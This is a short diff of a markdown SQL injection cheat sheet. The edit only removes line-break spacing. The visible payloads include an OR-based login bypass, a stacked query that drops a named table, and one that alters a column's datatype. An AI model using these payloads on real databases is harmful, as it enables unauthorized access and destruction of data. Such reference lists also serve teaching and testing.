@@ -21,17 +21,11 @@ $SQL = "SELECT * FROM <i>{tablename}</i> WHERE <i>{username}</i> = ' + <b><i>1' 
 1' OR 1+1--
 \'
 ```
-
-<br>
-
 ### Where table name is known
 ```SQL
 1'; DROP TABLE {tablename} --
 
 ```
-
-<br>
-
 ### Where column name is known
 ```SQL
 1'; ALTER TABLE {tablename} ALTER COLUMN {columnname} {datatype} --
